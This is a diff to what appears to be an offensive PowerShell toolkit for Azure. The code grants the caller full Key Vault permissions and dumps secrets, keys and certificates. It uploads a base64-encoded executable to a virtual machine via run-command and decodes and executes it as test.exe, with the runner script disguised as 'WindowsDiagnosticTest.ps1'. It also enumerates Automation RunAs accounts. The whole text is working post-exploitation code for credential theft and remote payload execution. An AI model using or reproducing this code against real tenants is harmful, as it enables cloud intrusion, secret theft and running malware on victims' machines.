@@ -677,9 +677,9 @@ function Show-AzureKeyVaultContent
 	If($VaultName)
 	{			
 		Set-AzKeyVaultAccessPolicy -VaultName $vaultname -UserPrincipalName $name.Account -PermissionsToCertificates create,get,list,delete,import,update,recover,backup,restore -PermissionsToSecrets get,list,delete,recover,backup,restore -PermissionsToKeys create,get,list,delete,import,update,recover,backup,restore
-		$Secrets = $Vault | Get-AzKeyVaultSecret
-		$Keys = $Vault | Get-AzKeyVaultKey
-		$Certificates = $Vault | Get-AzKeyVaultCertificate 
+		$Secrets = $vaultname | Get-AzKeyVaultSecret
+		$Keys = $vaultname | Get-AzKeyVaultKey
+		$Certificates = $vaultname | Get-AzKeyVaultCertificate 
 		$obj = New-Object -TypeName psobject	
         $obj | Add-Member -MemberType NoteProperty -Name VaultName -Value $Vaultname
 		$obj | Add-Member -MemberType NoteProperty -Name SecretName -Value $Secrets.Name
@@ -1144,10 +1144,12 @@ function Invoke-AzureRunProgram
         {
             $ByteArray = [System.IO.File]::ReadAllBytes($File)
             $Base64String = [System.Convert]::ToBase64String($ByteArray) | Out-File temp.ps1 #This is necessary because raw output is too long for a command to be passed over az vm run-command invoke, so it must be in a script. 
-            $upload = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath temp.ps1 -verbose
-            $command = '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; $data = Get-Content C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\$name ;$Decode = [System.Convert]::FromBase64String($data);[System.IO.File]::WriteAllBytes("test.exe",$Decode);C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\test.exe'
+            Write-Host "Uploading Payload..."
+			$upload = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath temp.ps1 -verbose
+			$command = '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; $data = Get-Content C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\$name ;$Decode = [System.Convert]::FromBase64String($data);[System.IO.File]::WriteAllBytes("test.exe",$Decode);C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\test.exe'
             $new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $command -Force
             $path = $new.DirectoryName + '\' + $new.Name  
+			Write-Host "Executing Payload..."
             $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
             $result.value.Message 
             rm $path           
@@ -1532,7 +1534,11 @@ Get-AzureRunAsAccounts
 
     $obj = New-Object -TypeName psobject		 	
     $apps = Get-AzADApplication | Where-Object {$_.HomePage -Match 'automationAccounts'}
+	$name = $apps.DisplayName.Split("_")[0]
+	$aa = Get-AzAutomationAccount | Where-object {$_.AutomationAccountName -match $name}
+	$aaname = $aa.AutomationAccountName
     $sps = Get-AzADApplication | Where-Object {$_.HomePage -Match 'automationAccounts'} | Get-AzADServicePrincipal
+	$obj | Add-Member -MemberType NoteProperty -Name AutomationAccount -Value $aaname
     $obj | Add-Member -MemberType NoteProperty -Name AppName -Value $apps.DisplayName
     $obj | Add-Member -MemberType NoteProperty -Name AppObjectId -Value $apps.ObjectId
     $obj | Add-Member -MemberType NoteProperty -Name ApplicationId -Value $apps.ApplicationId
